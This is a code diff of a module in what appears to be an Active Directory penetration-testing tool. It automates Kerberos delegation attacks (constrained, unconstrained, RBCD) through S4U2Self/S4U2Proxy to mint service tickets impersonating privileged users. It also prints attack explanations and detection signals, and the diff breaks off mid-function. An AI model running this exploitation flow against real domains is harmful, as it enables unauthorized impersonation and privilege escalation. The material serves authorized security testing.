@@ -12,7 +12,6 @@ The service layer performs the tool execution and basic parsing; this module:
 from __future__ import annotations
 
 import os
-import re
 import subprocess
 from typing import Protocol
 
@@ -21,28 +20,220 @@ from adscan_internal import (
     print_error,
     print_info,
     print_info_debug,
-    print_info_verbose,
     print_success,
     print_warning,
     telemetry,
 )
 from adscan_internal.cli.common import build_lab_event_fields
-from adscan_internal.command_runner import default_runner
 from adscan_internal.rich_output import (
     mark_sensitive,
     print_exception,
+    print_panel,
+)
+from adscan_core.theme import (
+    COLOR_AMBER,
+    COLOR_CRIMSON,
+    COLOR_SAGE,
 )
 from rich.prompt import Confirm
 
-from adscan_internal.integrations.impacket.runner import (
-    ImpacketContext,
-    ImpacketKerberosRetryContext,
-    ImpacketRunner,
+from adscan_internal.services.machine_account_provisioning_service import (
+    record_machine_account_creation_result,
+    register_managed_machine_account,
 )
-from adscan_internal.services.machine_account_quota_state_service import (
-    clear_machine_account_quota_exhausted,
-    mark_machine_account_quota_exhausted,
-)
+
+
+# ---------------------------------------------------------------------------
+# Delegation-type pre-flight summaries
+# ---------------------------------------------------------------------------
+#
+# Each entry maps a normalised delegation kind to: the plain-English vector
+# description, what AD writes the exploit will perform, the OPSEC signals,
+# and the "Next" follow-up move. These power _delegation_preflight_panel()
+# so every exploit prompt explains itself rather than asking "yes/no?"
+# behind a single-line jargon string.
+_DELEGATION_PROFILES: dict[str, dict[str, object]] = {
+    "unconstrained": {
+        "title": "Unconstrained delegation, ticket capture",
+        "vector": (
+            "When the target service authenticates to a host trusting this "
+            "principal for unconstrained delegation, the host receives the "
+            "client's TGT in memory. Capturing that TGT yields full "
+            "impersonation of the original client."
+        ),
+        "ad_changes": [
+            "No persistent AD writes; capture is in-memory on the host.",
+            "Optional coercion to force a privileged client to authenticate.",
+        ],
+        "opsec": [
+            "Event 4768 / 4769 on the KDC when the forwarded TGT is reused.",
+            "MDI rule 'Suspected use of forged Kerberos ticket' on misuse.",
+        ],
+        "next": "Forge a silver / golden ticket from the captured TGT.",
+    },
+    "constrained": {
+        "title": "Constrained delegation, S4U2Self + S4U2Proxy",
+        "vector": (
+            "The principal can request service tickets for any user on the "
+            "configured allowed SPNs (msDS-AllowedToDelegateTo). With "
+            "protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION), the "
+            "S4U2Self step does not require the user's authenticator."
+        ),
+        "ad_changes": [
+            "No AD writes during exploitation, just S4U requests to the KDC.",
+            "Service ticket cached locally and persisted in the workspace.",
+        ],
+        "opsec": [
+            "Event 4769 on the KDC carrying ticket option 0x40810000.",
+            "MDI 'Suspected identity theft (pass-the-ticket)' if reused widely.",
+        ],
+        "next": "Use the cached service ticket against the allowed SPN.",
+    },
+    "rbcd": {
+        "title": "Resource-Based Constrained Delegation (RBCD)",
+        "vector": (
+            "Writing msDS-AllowedToActOnBehalfOfOtherIdentity on the target "
+            "computer allows the actor machine account to impersonate any "
+            "principal to that target. S4U2Self + S4U2Proxy then mints a "
+            "service ticket as a privileged user."
+        ),
+        "ad_changes": [
+            "LDAP write on msDS-AllowedToActOnBehalfOfOtherIdentity on the target.",
+            "Optional: SAMR creation of a new machine account when MAQ > 0.",
+        ],
+        "opsec": [
+            "Event 5136 on the PDC for the SD modification on the target.",
+            "Event 4741 if a new machine account is created via SAMR.",
+            "MDI rule 'Suspicious modification of an attribute' on RBCD writes.",
+        ],
+        "next": "Run S4U2Self + S4U2Proxy with the actor machine account.",
+    },
+}
+
+
+def _normalize_delegation_kind(raw: str) -> str:
+    value = (raw or "").strip().lower()
+    if "unconstrained" in value:
+        return "unconstrained"
+    if "rbcd" in value or "resource" in value or "based" in value:
+        return "rbcd"
+    if "constrained" in value:
+        return "constrained"
+    return value or "constrained"
+
+
+def _print_delegation_preflight_panel(
+    *,
+    delegation_kind: str,
+    marked_username: str,
+    marked_target: str,
+) -> None:
+    """Render the pre-flight context panel for a delegation exploit prompt.
+
+    The panel always renders before a Confirm.ask, so the operator sees the
+    vector, planned AD changes, OPSEC signals, and the Next step before
+    deciding. Falls back to a single warning line if the kind is unknown.
+    """
+    profile = _DELEGATION_PROFILES.get(_normalize_delegation_kind(delegation_kind))
+    if profile is None:
+        print_warning(
+            f"Delegation exploit available for {marked_target} via {marked_username}."
+        )
+        return
+
+    body_lines: list[str] = []
+    body_lines.append(f"[bold]Principal:[/bold] {marked_username}")
+    body_lines.append(f"[bold]Target:[/bold]    {marked_target}")
+    body_lines.append("")
+    body_lines.append("[bold]Why it works[/bold]")
+    body_lines.append(f"  {profile['vector']}")
+    body_lines.append("")
+    body_lines.append("[bold]Planned AD changes[/bold]")
+    for item in profile["ad_changes"]:  # type: ignore[index]
+        body_lines.append(f"  - {item}")
+    body_lines.append("")
+    body_lines.append("[bold]Detection signals[/bold]")
+    for item in profile["opsec"]:  # type: ignore[index]
+        body_lines.append(f"  ! {item}")
+    body_lines.append("")
+    body_lines.append(f"[bold]Next:[/bold] {profile['next']}")
+
+    # RBCD is the least-noisy of the three, render it in amber; the other two
+    # leave clear ticket-issue trails on the KDC, render them in crimson to
+    # match the "louder" detection footprint.
+    border = COLOR_AMBER if _normalize_delegation_kind(delegation_kind) == "rbcd" else COLOR_CRIMSON
+    print_panel(
+        "\n".join(body_lines),
+        title=f"[bold {border}]{profile['title']}[/bold {border}]",
+        border_style=border,
+        expand=False,
+    )
+
+
+def _print_s4u_success_panel(
+    *,
+    delegation_kind: str,
+    marked_impersonated: str,
+    marked_target: str,
+    marked_ticket_path: str,
+    next_hint: str,
+) -> None:
+    """Verdict-first success panel for an S4U-derived service ticket."""
+    kind = _normalize_delegation_kind(delegation_kind)
+    headline = {
+        "unconstrained": "Unconstrained delegation, TGT captured",
+        "constrained": "Constrained delegation, service ticket minted",
+        "rbcd": "RBCD service ticket minted",
+    }.get(kind, "Delegation service ticket minted")
+    body = (
+        f"[bold {COLOR_SAGE}]✓ {headline}[/bold {COLOR_SAGE}]\n\n"
+        f"[bold]Impersonated:[/bold]  {marked_impersonated}\n"
+        f"[bold]Target SPN:[/bold]    {marked_target}\n"
+        f"[bold]Ticket cache:[/bold]  {marked_ticket_path}\n\n"
+        f"[bold]Next:[/bold] {next_hint}"
+    )
+    print_panel(
+        body,
+        title=f"[bold {COLOR_SAGE}]Delegation success[/bold {COLOR_SAGE}]",
+        border_style=COLOR_SAGE,
+        expand=False,
+    )
+
+
+def _map_delegation_failure_hint(message: str) -> str:
+    """Map a raw S4U / RBCD failure message to a short actionable hint."""
+    lowered = (message or "").lower()
+    if not lowered:
+        return "Inspect the workspace log for the underlying Kerberos error."
+    if "not_for_user" in lowered or "kdc_err_badoption" in lowered:
+        return (
+            "Likely cause: target service is in Protected Users or "
+            "msDS-AllowedToDelegateTo / RBCD attribute does not include it."
+        )
+    if "logon_denied" in lowered or "sec_e_logon_denied" in lowered:
+        return (
+            "Likely cause: Kerberos ticket SPN mismatch. Confirm the target "
+            "FQDN matches the SPN and that DNS resolves correctly."
+        )
+    if "skew" in lowered:
+        return (
+            "Likely cause: clock skew with the KDC. Run the time-sync flow "
+            "and retry."
+        )
+    if "etype" in lowered or "encryption" in lowered:
+        return (
+            "Likely cause: AES-only KDC or RC4 disabled. Re-run with the "
+            "AES key (posture detection should pick this up automatically)."
+        )
+    if "access" in lowered and "deni" in lowered:
+        return (
+            "Likely cause: the principal does not actually hold the "
+            "delegation rights at runtime. Re-run the LDAP collector."
+        )
+    return "Inspect the workspace log for the underlying Kerberos error."
+
+
+# ---------------------------------------------------------------------------
 
 
 class DelegationShell(Protocol):
@@ -111,494 +302,6 @@ class DelegationShell(Protocol):
     ) -> None: ...
 
 
-def _build_impacket_context(shell: DelegationShell) -> ImpacketContext:
-    """Build central Impacket runner context from the interactive shell."""
-    return ImpacketContext(
-        impacket_scripts_dir=str(shell.impacket_scripts_dir or ""),
-        validate_script_exists=lambda path: os.path.isfile(path)
-        and os.access(path, os.X_OK),
-        get_domain_pdc=lambda domain: str(
-            (shell.domains_data.get(domain) or {}).get("pdc") or ""
-        )
-        or None,
-        sync_clock_with_pdc=lambda domain: bool(
-            shell.do_sync_clock_with_pdc(domain, verbose=True)
-        ),
-        workspace_dir=shell.current_workspace_dir,
-        domains_data=shell.domains_data,
-    )
-
-
-def _build_impacket_kerberos_retry_context(
-    shell: DelegationShell,
-    *,
-    domain: str,
-    username: str,
-    credential: str,
-) -> ImpacketKerberosRetryContext:
-    """Build deterministic Kerberos context for an Impacket auth principal."""
-    domain_info = shell.domains_data.get(domain) or {}
-    dc_ip = str(domain_info.get("pdc") or "").strip() or None
-    return ImpacketKerberosRetryContext(
-        domain=domain,
-        username=username,
-        credential=credential,
-        dc_ip=dc_ip,
-    )
-
-
-def _run_find_delegation_command(
-    shell: DelegationShell,
-    *,
-    command: str,
-    domain: str,
-    username: str,
-    password: str,
-    kerberos: bool = False,
-) -> subprocess.CompletedProcess[str] | None:
-    """Run ``findDelegation.py`` through the central Impacket runner."""
-    runner = ImpacketRunner(command_runner=default_runner)
-    kerberos_command = command if " -k" in f" {command}" else f"{command} -k"
-    selected_command = kerberos_command if kerberos else command
-    return runner.run_raw_command(
-        script_name="findDelegation.py",
-        command=selected_command,
-        ctx=_build_impacket_context(shell),
-        kerberos_retry_context=_build_impacket_kerberos_retry_context(
-            shell,
-            domain=domain,
-            username=username,
-            credential=password,
-        ),
-        auth_policy_protocol="ldap",
-        kerberos_command=kerberos_command,
-        timeout=300,
-        capture_output=True,
-    )
-
-
-def do_enum_delegations(shell: DelegationShell, domain: str) -> None:
-    """
-    Enumerates Kerberos delegations in the specified domain.
-
-    Usage: enum_delegations <domain>
-
-    Performs the enumeration of Kerberos delegations in the domain
-
-    """
-    from adscan_internal.rich_output import mark_sensitive
-
-    try:
-        # Build the base command
-        if not shell.impacket_scripts_dir:
-            print_error(
-                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
-            )
-            return
-        find_delegation_path = os.path.join(
-            shell.impacket_scripts_dir, "findDelegation.py"
-        )
-        if not os.path.isfile(find_delegation_path) or not os.access(
-            find_delegation_path, os.X_OK
-        ):
-            print_error(
-                f"findDelegation.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
-            )
-            return
-        auth_username = shell.domains_data[shell.domain]["username"]
-        auth_password = shell.domains_data[shell.domain]["password"]
-        auth = shell.build_auth_impacket_no_host(
-            auth_username,
-            auth_password,
-            shell.domain,
-        )
-        marked_domain = mark_sensitive(domain, "domain")
-        command = f"{find_delegation_path} {auth} -target-domain {marked_domain}"
-        marked_domain = mark_sensitive(domain, "domain")
-        print_info(f"Enumerating Kerberos delegations in domain {marked_domain}")
-        print_info_debug(f"Command: {command}")
-
-        # First execution without -k
-        completed_process = _run_find_delegation_command(
-            shell,
-            command=command,
-            domain=domain,
-            username=auth_username,
-            password=auth_password,
-        )
-        if completed_process is None:
-            print_error("Error enumerating delegations.")
-            return
-
-        output = completed_process.stdout
-        # stderr is available in completed_process.stderr if needed
-
-        # If there is a credential error, try with -k
-        if (
-            "invalidCredentials" in output or "AcceptSecurityContext error" in output
-        ):  # Check against 'output' from the first run
-            command += " -k"
-            print_info("Retrying with -k")
-            # Overwrite completed_process with the result of the retry
-            completed_process = _run_find_delegation_command(
-                shell,
-                command=command,
-                domain=domain,
-                username=auth_username,
-                password=auth_password,
-                kerberos=True,
-            )
-            if completed_process is None:
-                print_error("Error enumerating delegations.")
-                return
-            output = completed_process.stdout
-        if completed_process.returncode == 0:
-            # Initialize the domain dictionary if it does not exist
-            if domain not in shell.domains_data:
-                shell.domains_data[domain] = {}
-
-            # Initialize delegations as an empty list
-            shell.domains_data[domain]["delegations"] = []
-
-            # Check if there are no entries
-            if "No entries found!" in output:
-                print_error("No delegations found in domain.")
-                shell.update_report_field(domain, "unconstrained_delegation", None)
-                shell.update_report_field(domain, "constrained_delegation", None)
-
-                # Telemetry: track when no delegations found
-                try:
-                    properties = {
-                        "total_delegations": 0,
-                        "unconstrained_count": 0,
-                        "constrained_count": 0,
-                        "constrained_protocol_transition_count": 0,
-                        "resource_based_constrained_count": 0,
-                        "unknown_count": 0,
-                        "scan_mode": getattr(shell, "scan_mode", None),
-                        "auth_type": shell.domains_data[domain].get("auth", "unknown"),
-                        "workspace_type": shell.type,
-                        "auto_mode": shell.auto,
-                    }
-                    properties.update(
-                        build_lab_event_fields(shell=shell, include_slug=True)
-                    )
-                    telemetry.capture("delegations_enumerated", properties)
-                except Exception as e:
-                    telemetry.capture_exception(e)
-                return
-
-            # Split the output into lines and process
-            lines = output.strip().split("\n")
-            # Find the index of the line containing "AccountName"
-            try:
-                account_name_index = next(
-                    i for i, line in enumerate(lines) if "AccountName" in line
-                )
-                # Delegations begin two lines after "AccountName"
-                delegations_start = account_name_index + 2
-
-                # Track delegation types for telemetry (without exfiltrating user info)
-                delegation_type_counts = {
-                    "unconstrained": 0,
-                    "constrained": 0,
-                    "constrained_protocol_transition": 0,
-                    "resource_based_constrained": 0,
-                    "unknown": 0,
-                }
-
-                # Store full delegation data for rich display
-                delegations_full_data = []
-
-                # Process only the lines after the headers
-                for line in lines[delegations_start:]:
-                    if not line.strip():
-                        continue
-
-                    # Try to parse delegation type using regex (similar to enum_delegations_user)
-                    # Pattern matches: AccountName AccountType DelegationType DelegationTo
-                    matches = re.findall(
-                        r"(\S+)\s+(\S+)\s+((?:Resource-Based\s+)?(?:Unconstrained|Constrained)(?:\s+w/(?:o)?\s+Protocol\s+Transition)?)\s+(\S+)",
-                        line,
-                        re.IGNORECASE,
-                    )
-
-                    if matches:
-                        account, account_type, delegation_type, delegation_to = matches[
-                            0
-                        ]
-                        if account:  # If the account is not empty
-                            delegation_type_lower = delegation_type.lower()
-
-                            # Skip unconstrained delegations on Domain Controllers (false positives)
-                            try:
-                                is_unconstrained = (
-                                    "unconstrained" in delegation_type_lower
-                                    and "resource-based" not in delegation_type_lower
-                                )
-                                if (
-                                    is_unconstrained
-                                    and account_type.lower() == "computer"
-                                ):
-                                    # Convert machine account (e.g., DC$) to hostname for DC detection
-                                    host_candidate = account.rstrip("$")
-                                    if host_candidate and shell.is_computer_dc(
-                                        domain, host_candidate
-                                    ):
-                                        marked_domain = mark_sensitive(domain, "domain")
-                                        marked_account = mark_sensitive(account, "user")
-                                        print_info_debug(
-                                            "[delegation] Skipping unconstrained "
-                                            "delegation for Domain Controller "
-                                            f"account {marked_account} in domain "
-                                            f"{marked_domain} (considered expected "
-                                            "behaviour)."
-                                        )
-                                        # Do not store or count this delegation
-                                        continue
-                            except Exception as exc:
-                                telemetry.capture_exception(exc)
-
-                            shell.domains_data[domain]["delegations"].append(account)
-
-                            # Store full delegation data
-                            delegations_full_data.append(
-                                {
-                                    "account": account,
-                                    "account_type": account_type,
-                                    "delegation_type": delegation_type,
-                                    "delegation_to": delegation_to,
-                                }
-                            )
-
-                            # Classify delegation type for telemetry
-                            if "unconstrained" in delegation_type_lower:
-                                delegation_type_counts["unconstrained"] += 1
-                            elif "resource-based" in delegation_type_lower:
-                                delegation_type_counts[
-                                    "resource_based_constrained"
-                                ] += 1
-                            elif (
-                                "protocol transition" in delegation_type_lower
-                                and "w/o" not in delegation_type_lower
-                            ):
-                                delegation_type_counts[
-                                    "constrained_protocol_transition"
-                                ] += 1
-                            elif "constrained" in delegation_type_lower:
-                                delegation_type_counts["constrained"] += 1
-                            else:
-                                delegation_type_counts["unknown"] += 1
-                    else:
-                        # Fallback: simple parsing for lines that don't match regex
-                        parts = line.split()
-                        if parts and len(parts) > 0:
-                            account = parts[0].strip()
-                            if account:  # If the account is not empty
-                                shell.domains_data[domain]["delegations"].append(
-                                    account
-                                )
-                                # Store with unknown type
-                                delegations_full_data.append(
-                                    {
-                                        "account": account,
-                                        "account_type": "Unknown",
-                                        "delegation_type": "Unknown",
-                                        "delegation_to": "N/A",
-                                    }
-                                )
-                                delegation_type_counts["unknown"] += 1
-
-                # Remove duplicates while preserving order
-                shell.domains_data[domain]["delegations"] = list(
-                    dict.fromkeys(shell.domains_data[domain]["delegations"])
-                )
-
-                total_delegations = len(shell.domains_data[domain]["delegations"])
-
-                # Update the technical report cache for delegation-related findings
-                if total_delegations == 0:
-                    # Explicitly record that no delegations were found
-                    shell.update_report_field(domain, "unconstrained_delegation", None)
-                    shell.update_report_field(domain, "constrained_delegation", None)
-                else:
-                    has_unconstrained = delegation_type_counts["unconstrained"] > 0
-                    has_constrained = any(
-                        delegation_type_counts[key] > 0
-                        for key in (
-                            "constrained",
-                            "constrained_protocol_transition",
-                            "resource_based_constrained",
-                        )
-                    )
-                    shell.update_report_field(
-                        domain, "unconstrained_delegation", has_unconstrained
-                    )
-                    shell.update_report_field(
-                        domain, "constrained_delegation", has_constrained
-                    )
-
-                # Telemetry: track delegation enumeration results
-                try:
-                    properties = {
-                        "total_delegations": total_delegations,
-                        "unconstrained_count": delegation_type_counts["unconstrained"],
-                        "constrained_count": delegation_type_counts["constrained"],
-                        "constrained_protocol_transition_count": delegation_type_counts[
-                            "constrained_protocol_transition"
-                        ],
-                        "resource_based_constrained_count": delegation_type_counts[
-                            "resource_based_constrained"
-                        ],
-                        "unknown_count": delegation_type_counts["unknown"],
-                        "scan_mode": getattr(shell, "scan_mode", None),
-                        "auth_type": shell.domains_data[domain].get("auth", "unknown"),
-                        "workspace_type": shell.type,
-                        "auto_mode": shell.auto,
-                    }
-                    properties.update(
-                        build_lab_event_fields(shell=shell, include_slug=True)
-                    )
-                    telemetry.capture("delegations_enumerated", properties)
-                except Exception as e:
-                    telemetry.capture_exception(e)
-
-                # Display delegations with professional formatting
-                from adscan_internal.rich_output import print_delegations_summary
-
-                print_delegations_summary(domain, delegations_full_data)
-            except StopIteration as e:
-                telemetry.capture_exception(e)
-                print_error("Expected structure not found in output")
-
-                # If the expected structure is missing, mark delegations as not found
-                shell.update_report_field(domain, "unconstrained_delegation", None)
-                shell.update_report_field(domain, "constrained_delegation", None)
-
-                # Telemetry: track when no delegations structure found
-                try:
-                    properties = {
-                        "total_delegations": 0,
-                        "unconstrained_count": 0,
-                        "constrained_count": 0,
-                        "constrained_protocol_transition_count": 0,
-                        "resource_based_constrained_count": 0,
-                        "unknown_count": 0,
-                        "error": "structure_not_found",
-                        "scan_mode": getattr(shell, "scan_mode", None),
-                        "auth_type": shell.domains_data[domain].get("auth", "unknown"),
-                        "workspace_type": shell.type,
-                        "auto_mode": shell.auto,
-                    }
-                    properties.update(
-                        build_lab_event_fields(shell=shell, include_slug=True)
-                    )
-                    telemetry.capture("delegations_enumerated", properties)
-                except Exception as exc:
-                    telemetry.capture_exception(exc)
-        else:
-            print_error(
-                f"Error enumerating delegations: {completed_process.stderr.strip() if completed_process.stderr else 'Details not available'}"
-            )
-    except Exception as e:
-        telemetry.capture_exception(e)
-        print_error("Error enumerating delegations.")
-        print_exception(show_locals=False, exception=e)
-
-
-def enum_delegations_user(
-    shell: DelegationShell, domain: str, username: str, password: str
-) -> None:
-    from adscan_internal.rich_output import mark_sensitive
-
-    try:
-        # Build the base command
-        auth = shell.build_auth_impacket_no_host(username, password, domain)
-        if not shell.impacket_scripts_dir:
-            print_error(
-                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
-            )
-            return
-        find_delegation_path = os.path.join(
-            shell.impacket_scripts_dir, "findDelegation.py"
-        )
-        if not os.path.isfile(find_delegation_path) or not os.access(
-            find_delegation_path, os.X_OK
-        ):
-            print_error(
-                f"findDelegation.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
-            )
-            return
-        marked_domain = mark_sensitive(domain, "domain")
-        command = f"{find_delegation_path} {auth} -target-domain {marked_domain}"
-        marked_username = mark_sensitive(username, "user")
-        print_info_verbose(f"Enumerating delegation details for user {marked_username}")
-
-        # First execution without -k
-        completed_process = _run_find_delegation_command(
-            shell,
-            command=command,
-            domain=domain,
-            username=username,
-            password=password,
-        )
-        if completed_process is None:
-            print_error("Error enumerating user delegations.")
-            return
-        output = completed_process.stdout
-        error = completed_process.stderr
-        # If there is a credentials error, try with -k
-        if "invalidCredentials" in output or "AcceptSecurityContext error" in output:
-            command += " -k"
-            print_success("Retrying with -k")
-            completed_process = _run_find_delegation_command(
-                shell,
-                command=command,
-                domain=domain,
-                username=username,
-                password=password,
-                kerberos=True,
-            )
-            if completed_process is None:
-                print_error("Error enumerating user delegations.")
-                return
-            output = completed_process.stdout
-            error = completed_process.stderr
-        if completed_process.returncode == 0:
-            # Process the output line by line
-            lines = output.strip().split("\n")
-            for line in lines:
-                if line.startswith("AccountName") or line.startswith("-"):
-                    continue
-
-                # Use regular expression to split the line while preserving spaces in delegation types
-                matches = re.findall(
-                    r"(\S+)\s+(\S+)\s+((?:Resource-Based\s+)?Constrained(?:\s+w/(?:o)?\s+Protocol\s+Transition)?)\s+(\S+)",
-                    line,
-                )
-
-                if matches:
-                    account_name, account_type, delegation_type, delegation_to = (
-                        matches[0]
-                    )
-                    if account_name == username:  # Only process the specific user
-                        # Directly proceed to ask for exploitation with the full delegation type
-                        shell.ask_for_exploit_delegation(
-                            domain,
-                            username,
-                            password,
-                            delegation_type,
-                            delegation_to,
-                        )
-                        break  # Exit after finding the user
-        else:
-            print_error(f"Error enumerating delegations: {error}")
-    except Exception as e:
-        telemetry.capture_exception(e)
-        print_error("Error enumerating user delegations.")
-        print_exception(show_locals=False, exception=e)
-
-
 def ask_for_exploit_delegation(
     shell: DelegationShell,
     domain: str,
@@ -612,8 +315,19 @@ def ask_for_exploit_delegation(
 
     marked_delegation_to = mark_sensitive(delegation_to, "service")
     marked_username = mark_sensitive(username, "user")
+
+    # Pre-flight context: render the vector + AD changes + OPSEC + Next step
+    # so the operator decides with the full picture rather than from the
+    # one-liner Confirm.ask string.
+    _print_delegation_preflight_panel(
+        delegation_kind=delegation_type,
+        marked_username=marked_username,
+        marked_target=marked_delegation_to,
+    )
+
     respuesta = Confirm.ask(
-        f"Do you want to exploit the delegation {delegation_type} on {marked_delegation_to} for user {marked_username}?",
+        f"Exploit {delegation_type} delegation on {marked_delegation_to} "
+        f"as {marked_username}?",
         default=True,
     )
     if respuesta:
@@ -623,6 +337,45 @@ def ask_for_exploit_delegation(
             exploit_delegation_constrained(
                 shell, domain, username, password, delegation_to
             )
+
+
+def _run_s4u_native(
+    shell: DelegationShell,
+    *,
+    domain: str,
+    username: str,
+    password: str,
+    impersonate_user: str,
+    service_spn: str,
+    ccache_output_path: str,
+) -> object:
+    """Run native S4U (S4U2Self + S4U2Proxy) via kerbad. Raises on failure."""
+    from adscan_internal.services.exploitation.delegation_native import (  # noqa: PLC0415
+        run_s4u_get_st_native,
+    )
+    domain_info = shell.domains_data.get(domain) or {}
+    kdc_ip = str(domain_info.get("pdc") or "").strip()
+    if not kdc_ip:
+        raise RuntimeError(f"No PDC IP found for domain {domain!r}; cannot run S4U.")
+    nt_hash: str | None = None
+    plain_password = password
+    if (
+        password
+        and len(password) == 32
+        and all(c in "0123456789abcdefABCDEF" for c in password)
+    ):
+        nt_hash = password
+        plain_password = ""
+    return run_s4u_get_st_native(
+        domain=domain,
+        kdc_ip=kdc_ip,
+        username=username,
+        password=plain_password,
+        nt_hash=nt_hash,
+        impersonate_user=impersonate_user,
+        service_spn=service_spn,
+        ccache_output_path=ccache_output_path,
+    )
 
 
 def exploit_delegation_constrained(
@@ -635,32 +388,14 @@ def exploit_delegation_constrained(
     from adscan_internal.rich_output import mark_sensitive
 
     try:
-        # Extract the hostname from the SPN (after the forward slash)
         target_host = (
             delegation_to.split("/")[1] if "/" in delegation_to else delegation_to
         )
         target_user = shell.get_delegatable_privileged_user(domain)
 
-        # Build the netexec command
-        auth = shell.build_auth_impacket_no_host(username, password, domain)
-        if not shell.impacket_scripts_dir:
-            print_error(
-                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
-            )
-            return
-        get_st_path = os.path.join(shell.impacket_scripts_dir, "getST.py")
-        if not os.path.isfile(get_st_path) or not os.access(get_st_path, os.X_OK):
-            print_error(
-                f"getST.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
-            )
-            return
-        marked_delegation_to = mark_sensitive(delegation_to, "service")
-        command = f"{get_st_path} -spn '{marked_delegation_to}' -impersonate '{target_user}' {auth}"
-
         marked_target_host = mark_sensitive(target_host, "hostname")
         print_info(f"Exploiting constrained delegation against {marked_target_host}")
 
-        # Telemetry: track delegation exploitation attempt
         try:
             properties = {
                 "delegation_type": "constrained_protocol_transition",
@@ -674,15 +409,29 @@ def exploit_delegation_constrained(
         except Exception as e:
             telemetry.capture_exception(e)
 
-        # Execute the command using the existing execute_dump_lsa function
-        execute_constrained(
+        # Native S4U: kerbad handles the S4U2Self+S4U2Proxy chain, including
+        # protocol-transition branching when TRUSTED_TO_AUTH is set.
+        ccache_path = os.path.join(
+            shell._get_workspace_cwd(),
+            f"{target_user}@{target_host}.{domain}.ccache",
+        )
+        native = _run_s4u_native(
             shell,
-            command,
-            domain,
-            target_host,
-            target_user,
+            domain=domain,
             username=username,
             password=password,
+            impersonate_user=target_user or "",
+            service_spn=delegation_to,
+            ccache_output_path=ccache_path,
+        )
+        _handle_constrained_native_result(
+            shell,
+            native,
+            domain=domain,
+            target_host=target_host,
+            target_user=target_user or "",
+            service_spn=delegation_to,
+            owner_principal=username,
         )
 
     except Exception as e:
@@ -691,151 +440,169 @@ def exploit_delegation_constrained(
         print_exception(show_locals=False, exception=e)
 
 
-def execute_constrained(
+def _persist_service_ticket_after_s4u(
     shell: DelegationShell,
-    command: str,
+    *,
+    domain: str,
+    ccache_path: str,
+    kind: str,
+    owner_principal: str,
+    impersonated_user: str,
+    spn: str,
+    target_host: str,
+) -> None:
+    """Register an S4U-derived service ticket in ``domains_data["service_tickets"]``.
+
+    Service tickets produced by RBCD or constrained-delegation flows must
+    NOT be stored in ``kerberos_tickets``: they are not TGTs. This helper
+    parses the resulting ccache, extracts the issuance / expiry timestamps
+    and persists a structured record so follow-up steps can locate the
+    ticket by SPN/host instead of walking workspace files.
+
+    Failures are logged at debug level and swallowed: missing persistence is
+    a soft loss (the ccache file is still on disk), not worth aborting an
+    otherwise successful exploitation.
+    """
+    try:
+        from adscan_internal.models.service_ticket import (  # noqa: PLC0415
+            ServiceTicket,
+            ServiceTicketKind,
+        )
+        from adscan_internal.services.credential_store_service import (  # noqa: PLC0415
+            CredentialStoreService,
+        )
+        from adscan_internal.services.kerberos_ccache_inspector import (  # noqa: PLC0415
+            inspect_ccache,
+        )
+
+        info = inspect_ccache(ccache_path)
+        first_st = info.first_service_ticket()
+        ticket = ServiceTicket(
+            ccache_path=str(ccache_path).strip(),
+            kind=ServiceTicketKind.coerce(kind),
+            owner_principal=str(owner_principal or "").strip()
+            or (info.default_client_name or ""),
+            impersonated_user=str(impersonated_user or "").strip(),
+            spn=str(spn or "").strip()
+            or (first_st.server_spn if first_st else ""),
+            target_host=str(target_host or "").strip(),
+            realm=(info.default_client_realm or domain.upper() if domain else "")
+            .strip()
+            .upper(),
+            issued_at=first_st.starttime if first_st else None,
+            expires_at=first_st.endtime if first_st else None,
+        )
+        CredentialStoreService().store_service_ticket(
+            domains_data=getattr(shell, "domains_data", {}),
+            domain=domain,
+            ticket=ticket,
+        )
+        print_info_debug(
+            f"[delegation] persisted service ticket {mark_sensitive(ticket.ccache_path, 'path')} "
+            f"kind={ticket.kind.value} spn={mark_sensitive(ticket.spn, 'service')} "
+            f"impersonated={mark_sensitive(ticket.impersonated_user, 'user')}"
+        )
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        print_info_debug(
+            f"[delegation] failed to persist service ticket "
+            f"{mark_sensitive(ccache_path, 'path')}: "
+            f"{type(exc).__name__}: {mark_sensitive(str(exc), 'detail')}"
+        )
+
+
+def _handle_constrained_native_result(
+    shell: DelegationShell,
+    result: object,
+    *,
     domain: str,
     target_host: str,
     target_user: str,
-    *,
-    username: str = "",
-    password: str = "",
+    service_spn: str = "",
+    owner_principal: str = "",
 ) -> None:
     from adscan_internal.rich_output import mark_sensitive
-    from adscan_internal.services.exploitation import ExploitationService
 
-    try:
-        service = ExploitationService()
-        impacket_context = (
-            _build_impacket_context(shell) if username and password else None
-        )
-        kerberos_retry_context = (
-            _build_impacket_kerberos_retry_context(
-                shell,
-                domain=domain,
-                username=username,
-                credential=password,
-            )
-            if username and password
-            else None
-        )
-        runner_kwargs = {}
-        if impacket_context is not None and kerberos_retry_context is not None:
-            runner_kwargs = {
-                "impacket_context": impacket_context,
-                "kerberos_retry_context": kerberos_retry_context,
-            }
-        result = service.delegation.run_s4proxy_command(
-            command=command,
-            timeout=300,
-            **runner_kwargs,
-        )
-        output_str = (result.stdout or "") + (result.stderr or "")
-
-        if result.returncode == 0:
-            marked_target_host = mark_sensitive(target_host, "hostname")
-            print_success(f"Command executed successfully on {marked_target_host}.")
-
-            # Update active attack-graph edge (if this exploitation was launched from an attack path).
-            if hasattr(shell, "_update_active_attack_graph_step_status"):
-                try:
-                    shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
-                        domain=domain,
-                        status="success",
-                        notes={
-                            "target_host": target_host,
-                            "impersonated": target_user,
-                        },
-                    )
-                except Exception as exc:
-                    telemetry.capture_exception(exc)
-
-            # Extract the .ccache file path from the output
-            match = re.search(r"Saving ticket in ([^\s]+)", output_str)
-            if match:
-                ccache_file = match.group(1)
-                print_warning(f".ccache file found: {ccache_file}")
-            else:
-                print_error("Could not extract the .ccache file from the output.")
-                ccache_file = None
-
-            # Telemetry: track successful delegation exploitation
+    if result.success:
+        marked_target_host = mark_sensitive(target_host, "hostname")
+        if hasattr(shell, "_update_active_attack_graph_step_status"):
             try:
-                properties = {
+                shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
+                    domain=domain,
+                    status="success",
